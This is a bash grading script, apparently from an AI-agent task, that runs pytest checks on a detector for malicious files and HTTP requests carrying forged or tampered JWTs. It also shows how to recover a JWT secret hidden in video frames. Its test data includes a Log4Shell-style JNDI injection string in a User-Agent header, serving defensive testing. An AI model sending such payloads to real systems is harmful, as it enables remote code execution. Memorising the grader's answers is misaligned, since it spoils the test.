#!/bin/bash
set -e
mkdir -p /logs/verifier

cat << 'TEST_EOF' > /tmp/test_final_state.py
import os
import secrets
import subprocess
import tempfile
import uuid

import jwt
import pytest

SCRIPT_PATH = "/home/user/detector.py"


def run_detector(path):
    return subprocess.run(
        ["python3", SCRIPT_PATH, path],
        capture_output=True,
        timeout=10,
    ).returncode


def extract_secret():
    video = "/app/evidence.mp4"
    assert os.path.exists(video), f"Evidence video {video} is missing."
    assert os.path.isfile(video), f"{video} is not a file."

    result = subprocess.run(
        [
            "ffmpeg", "-v", "error", "-i", video,
            "-vf", "format=rgb24", "-frames:v", "16",
            "-f", "rawvideo", "-pix_fmt", "rgb24", "pipe:1",
        ],
        capture_output=True,
        timeout=30,
    )
    assert result.returncode == 0, result.stderr.decode(errors="replace")

    frame_size = 1280 * 720 * 3
    assert len(result.stdout) >= 16 * frame_size, "Evidence video has fewer than 16 decodable frames."
    center_offset = (360 * 1280 + 640) * 3
    key_bytes = bytes(result.stdout[i * frame_size + center_offset] for i in range(16))
    try:
        secret = key_bytes.decode("ascii")
    except UnicodeDecodeError as exc:
        pytest.fail(f"Extracted video key is not ASCII: {exc}")
    assert len(secret) == 16
    return secret


def make_request(token, user_agent="Mozilla/5.0"):
    return (
        "GET /api/data HTTP/1.1\r\n"
        "Host: example.com\r\n"
        f"User-Agent: {user_agent}\r\n"
        f"Authorization: Bearer {token}\r\n"
        "\r\n"
    )


def test_detector_script_exists():
    assert os.path.exists(SCRIPT_PATH), f"Detector script {SCRIPT_PATH} does not exist."
    assert os.path.isfile(SCRIPT_PATH), f"{SCRIPT_PATH} is not a file."


def test_adversarial_corpus():
    clean_dir = "/app/corpus/clean/"
    evil_dir = "/app/corpus/evil/"

    assert os.path.exists(clean_dir), f"Clean directory {clean_dir} missing."
    assert os.path.exists(evil_dir), f"Evil directory {evil_dir} missing."

    clean_files = [os.path.join(clean_dir, f) for f in os.listdir(clean_dir) if os.path.isfile(os.path.join(clean_dir, f))]
    evil_files = [os.path.join(evil_dir, f) for f in os.listdir(evil_dir) if os.path.isfile(os.path.join(evil_dir, f))]

    assert len(clean_files) > 0, f"No files found in {clean_dir}"
    assert len(evil_files) > 0, f"No files found in {evil_dir}"

    bypassed_evil = []
    for evil_file in evil_files:
        if run_detector(evil_file) != 1:
            bypassed_evil.append(os.path.basename(evil_file))

    flagged_clean = []
    for clean_file in clean_files:
        if run_detector(clean_file) != 0:
            flagged_clean.append(os.path.basename(clean_file))

    error_msgs = []
    if bypassed_evil:
        error_msgs.append(f"{len(bypassed_evil)} of {len(evil_files)} evil bypassed: {', '.join(bypassed_evil)}")
    if flagged_clean:
        error_msgs.append(f"{len(flagged_clean)} of {len(clean_files)} clean modified/flagged: {', '.join(flagged_clean)}")
    if error_msgs:
        pytest.fail(" | ".join(error_msgs))


def test_generated_requests_at_unlabeled_paths():
    secret = extract_secret()
    nonce = secrets.token_hex(16)

    ordinary_payload = {"user": "generated-" + nonce, "admin": False, "nonce": secrets.token_hex(12)}
    valid_token = jwt.encode(ordinary_payload, secret, algorithm="HS256")

    parts = valid_token.split(".")
    assert len(parts) == 3 and parts[2]
    position = secrets.randbelow(len(parts[2]))
    original = parts[2][position]
    replacement = "A" if original != "A" else "B"
    altered_signature = parts[2][:position] + replacement + parts[2][position + 1:]
    altered_token = ".".join([parts[0], parts[1], altered_signature])

    second_clean = jwt.encode(
        {"user": "clean-" + secrets.token_hex(10), "admin": False},
        secret,
        algorithm="HS256",
    )
    admin_token = jwt.encode(
        {"user": "admin-" + secrets.token_hex(10), "admin": True},
        secret,
        algorithm="HS256",
    )
    wrong_key = secrets.token_urlsafe(24)
    while wrong_key == secret:
        wrong_key = secrets.token_urlsafe(24)
    wrong_key_token = jwt.encode(
        {"user": "invalid-" + secrets.token_hex(10), "admin": False},
        wrong_key,
        algorithm="HS256",
    )
    exploit_token = jwt.encode(
        {"user": "ua-" + secrets.token_hex(10), "admin": False},
        secret,
        algorithm="HS256",
    )

    cases = [
        (make_request(valid_token), 0),
        (make_request(second_clean), 0),
        (make_request(admin_token), 1),
        (make_request(altered_token), 1),
        (make_request(wrong_key_token), 1),
        (make_request(exploit_token, "Mozilla/5.0 ${jndi:ldap://" + secrets.token_hex(8) + "/x}"), 1),
    ]
    secrets.SystemRandom().shuffle(cases)

    failures = []
    with tempfile.TemporaryDirectory(prefix="http-inputs-") as directory:
        paths = []
        for request, expected in cases:
            path = os.path.join(directory, uuid.uuid4().hex + ".txt")
            with open(path, "w", newline="") as handle:
                handle.write(request)
            paths.append((path, expected))

        secrets.SystemRandom().shuffle(paths)
        for path, expected in paths:
            actual = run_detector(path)
            if actual != expected:
                failures.append(f"{os.path.basename(path)}: expected {expected}, got {actual}")

    assert not failures, "Generated request classification failures: " + "; ".join(failures)
TEST_EOF

if python3 -m pytest /tmp/test_final_state.py -x --tb=short 2>&1; then
    echo "1" > /logs/verifier/reward.txt
else
    echo "0" > /logs/verifier/reward.txt
fi
